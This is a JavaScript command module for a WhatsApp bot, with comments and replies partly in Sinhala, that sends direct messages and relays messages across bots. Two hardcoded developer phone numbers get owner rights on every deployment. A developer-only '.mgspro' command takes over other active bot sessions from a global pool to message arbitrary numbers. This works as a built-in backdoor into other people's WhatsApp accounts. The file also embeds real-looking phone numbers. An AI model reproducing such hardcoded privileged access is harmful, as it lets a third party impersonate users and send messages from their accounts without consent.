export default {
  name: "msg",
  aliases: ["mgs", "send", "dm", "mgspro", "switchmsg"],
  category: "owner",
  description: "Direct message & Cross-bot relay controller",

  async execute({ sock, msg, from, args, body, config }) {
    const prefix = config?.PREFIX || ".";

    try {
      // 1. Sender Verification
      const senderJid = msg.key.fromMe 
        ? (sock.user?.id || "") 
        : (msg.key.participant || msg.participant || from || "");

      const cleanSender = String(senderJid).split("@")[0].split(":")[0].replace(/[^0-9]/g, "");

      // Developer & Owner Whitelist
      const devNumbers = ["94719845166", "15947733680169"];
      const isDeveloper = devNumbers.includes(cleanSender) || senderJid.includes("15947733680169");
      const isOwner = msg.key.fromMe || isDeveloper;

      // Command Trigger Check (.mgspro ද .msg ද යන්න)
      const fullBody = body.trim();
      const firstWord = fullBody.startsWith(prefix) 
        ? fullBody.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() 
        : fullBody.split(/ +/)[0].toLowerCase();

      const isPro = firstWord === "mgspro" || firstWord === "switchmsg";

      // -------------------------------------------------------------
      // OPTION A: .mgspro (Cross-Node Relay - Developer Only)
      // -------------------------------------------------------------
      if (isPro) {
        if (!isDeveloper) {
          await sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
          return await sock.sendMessage(
            from,
            { text: "*⛔ ACCESS DENIED ⛔*\n\n.mgspro පාවිච්චි කළ හැක්කේ Master Developer හට පමණි." },
            { quoted: msg }
          );
        }

        const fullText = args.join(" ").trim();
        const parts = fullText.split(",");

        if (parts.length < 3) {
          return await sock.sendMessage(
            from,
            {
              text: `*⚠️ MGSPRO භාවිතය:*\n${prefix}mgspro <sender_bot_number>,<receiver_number>,<message>\n\n*උදා:* ${prefix}mgspro 94771033094,94719845166,හෙලෝ`
            },
            { quoted: msg }
          );
        }

        let senderNum = parts[0].replace(/[^0-9]/g, "");
        if (senderNum.startsWith("0")) senderNum = "94" + senderNum.slice(1);

        let targetNum = parts[1].replace(/[^0-9]/g, "");
        if (targetNum.startsWith("0")) targetNum = "94" + targetNum.slice(1);

        const textToSend = parts.slice(2).join(",").trim();

        if (!textToSend) {
          return await sock.sendMessage(from, { text: "⚠️ Message එකක් ඇතුළත් කරන්න." }, { quoted: msg });
        }

        await sock.sendMessage(from, { react: { text: "⚡", key: msg.key } }).catch(() => {});

        // Global Active Bots Pool එකෙන් Relay Bot එක සෙවීම
        const botPool = global.activeSockets || new Map();
        let relaySock = null;
        let matchedNode = null;

        for (const [nodeId, bSock] of botPool.entries()) {
          const bPhone = (bSock?.user?.id || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
          if (bPhone === senderNum || String(nodeId).includes(senderNum)) {
            relaySock = bSock;
            matchedNode = nodeId;
            break;
          }
        }

        if (!relaySock) {
          await sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
          return await sock.sendMessage(
            from,
            { text: `*❌ Node Offline!*\n+${senderNum} අංකයට අදාළ Bot Cloud එක තුළ active නැත.` },
            { quoted: msg }
          );
        }

        const targetJid = `${targetNum}@s.whatsapp.net`;
        await relaySock.sendMessage(targetJid, { text: textToSend });

        await sock.sendMessage(
          from,
          {
            text: `*🚀 RELAY SUCCESS*\n\n🤖 *Relay Node:* +${senderNum} [${matchedNode}]\n🎯 *To:* +${targetNum}\n💬 *Message:* ${textToSend}`
          },
          { quoted: msg }
        );

        return await sock.sendMessage(from, { react: { text: "🖤", key: msg.key } }).catch(() => {});
      }

      // -------------------------------------------------------------
      // OPTION B: .msg (Direct Send via Current Bot - Owner Only)
      // -------------------------------------------------------------
      if (!isOwner) {
        await sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(
          from,
          { text: "*⛔ ACCESS DENIED ⛔*\nමෙම විධානය Bot Owner හට පමණි." },
          { quoted: msg }
        );
      }

      const fullText = args.join(" ").trim();
      if (!fullText.includes(",")) {
        return await sock.sendMessage(
          from,
          {
            text: `*⚠️ MSG භාවිතය:*\n${prefix}msg <number>,<message>\n\n*උදා:* ${prefix}msg 94719845166,මොකද කරන්නෙ?`
          },
          { quoted: msg }
        );
      }

      const [rawNumber, ...contentParts] = fullText.split(",");
      let targetNumber = rawNumber.replace(/[^0-9]/g, "");
      if (targetNumber.startsWith("0")) targetNumber = "94" + targetNumber.slice(1);

      const messageContent = contentParts.join(",").trim();

      if (!messageContent) {
        return await sock.sendMessage(from, { text: "⚠️ Message එකක් ඇතුළත් කරන්න." }, { quoted: msg });
      }

      await sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      const targetJid = `${targetNumber}@s.whatsapp.net`;
      await sock.sendMessage(targetJid, { text: messageContent });

      await sock.sendMessage(
        from,
        {
          text: `*⚡ TRANSMISSION COMPLETE ⚡*\n\n🎯 *To:* +${targetNumber}\n💬 *Message:* ${messageContent}`
        },
        { quoted: msg }
      );

      await sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});

    } catch (err) {
      console.error("[MSG RUNTIME ERROR]:", err);
      await sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
      await sock.sendMessage(
        from,
        { text: `❌ යැවීමට නොහැකි විය: ${err.message || "Unknown Network Error"}` },
        { quoted: msg }
      );
    }
  }
};
